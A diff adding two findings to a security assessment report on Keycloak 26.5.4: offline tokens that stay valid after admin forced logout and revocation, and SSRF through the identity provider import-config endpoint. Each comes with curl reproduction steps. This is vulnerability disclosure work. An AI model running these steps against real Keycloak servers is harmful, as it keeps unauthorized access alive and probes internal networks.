@@ -17,6 +17,8 @@ Manual security assessment of Keycloak 26.5.4 (latest stable) targeting the offi
 |---|---|---|---|
 | 1 | [CORS webOrigins Bypass — Cross-Origin Token Theft](#finding-1) | **HIGH** | 8.1 |
 | 2 | [alg:none JWT causes HTTP 500 (NullPointerException)](#finding-2) | **MEDIUM** | 5.3 |
+| 3 | [Offline Token Persistence After Admin Session Revocation](#finding-3) | **HIGH** | 7.5 |
+| 4 | [SSRF via Identity Provider import-config Endpoint](#finding-4) | **MEDIUM** | 6.5 |
 
 ---
 
@@ -65,6 +67,68 @@ See: [`pocs/poc3_alg_none_npe.py`](pocs/poc3_alg_none_npe.py)
 
 ---
 
+## Finding #3 — Offline Token Persistence After Admin Revocation {#finding-3}
+
+**Type:** Improper session revocation / persistent credential after forced logout
+**Affected:** Offline Session Management, Token Revocation endpoints
+
+When an administrator performs incident response actions after a security breach (force-logout all sessions, push not-before policy), **offline tokens remain fully valid** and continue to produce new access tokens. The admin REST API provides no working endpoint to delete offline sessions — all `DELETE` requests return `HTTP 404`.
+
+**Attack scenario:**
+1. Attacker obtains an offline token using compromised credentials
+2. Organization detects breach; admin forces logout of all user sessions
+3. Admin pushes not-before revocation policy
+4. **Attacker's offline token still works** — full persistent access maintained
+
+**Quick reproduction:**
+```bash
+# 1. Get offline token
+OFFLINE_TOKEN=$(curl -s -X POST http://<KC_HOST>/realms/test/protocol/openid-connect/token \
+  -d "client_id=test-confidential&client_secret=mysecret123&grant_type=password&username=testuser&password=Password123&scope=offline_access" \
+  | python3 -c "import sys,json; print(json.load(sys.stdin)['refresh_token'])")
+
+# 2. Admin forces logout
+curl -X POST -H "Authorization: Bearer $ADMIN_TOKEN" \
+  "http://<KC_HOST>/admin/realms/test/users/$USER_ID/logout"  # HTTP 204
+
+# 3. Admin pushes notBefore
+curl -X POST -H "Authorization: Bearer $ADMIN_TOKEN" \
+  "http://<KC_HOST>/admin/realms/test/push-revocation"  # {}
+
+# 4. Offline token STILL WORKS
+curl -s -X POST http://<KC_HOST>/realms/test/protocol/openid-connect/token \
+  -d "client_id=test-confidential&client_secret=mysecret123&grant_type=refresh_token&refresh_token=$OFFLINE_TOKEN"
+# → Returns valid access_token!
+```
+
+See: [`pocs/poc4_offline_token_persistence.sh`](pocs/poc4_offline_token_persistence.sh)
+
+---
+
+## Finding #4 — SSRF via IdP import-config {#finding-4}
+
+**Type:** Server-Side Request Forgery
+**Affected:** `POST /admin/realms/{realm}/identity-provider/import-config`
+**Required role:** `manage-identity-providers` (realm admin level)
+
+The `fromUrl` parameter causes Keycloak to make an outbound HTTP request to any specified URL — including internal network addresses. This enables internal port scanning and internal service access for any user with the `manage-identity-providers` realm role.
+
+**Quick reproduction:**
+```bash
+# Start listener: python3 -m http.server 9999 --bind 127.0.0.1
+
+curl -X POST -H "Authorization: Bearer $ADMIN_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"providerId":"oidc","fromUrl":"http://127.0.0.1:9999/.well-known/openid-configuration"}' \
+  "http://<KC_HOST>/admin/realms/test/identity-provider/import-config"
+
+# Listener receives: "GET /.well-known/openid-configuration HTTP/1.1"
+```
+
+See: [`pocs/poc5_ssrf_idp_import.sh`](pocs/poc5_ssrf_idp_import.sh)
+
+---
+
 ## PoC Files
 
 | File | Description |
@@ -72,6 +136,8 @@ See: [`pocs/poc3_alg_none_npe.py`](pocs/poc3_alg_none_npe.py)
 | [`pocs/poc1_cors_token_hijack.html`](pocs/poc1_cors_token_hijack.html) | Browser PoC — CORS cross-origin token theft |
 | [`pocs/poc2_cors_null_origin.html`](pocs/poc2_cors_null_origin.html) | Browser PoC — `null`-origin sandboxed iframe attack |
 | [`pocs/poc3_alg_none_npe.py`](pocs/poc3_alg_none_npe.py) | Python PoC — alg:none → HTTP 500 |
+| [`pocs/poc4_offline_token_persistence.sh`](pocs/poc4_offline_token_persistence.sh) | Shell PoC — offline token survives admin revocation |
+| [`pocs/poc5_ssrf_idp_import.sh`](pocs/poc5_ssrf_idp_import.sh) | Shell PoC — SSRF via IdP import-config |
 
 ## Full Report
 
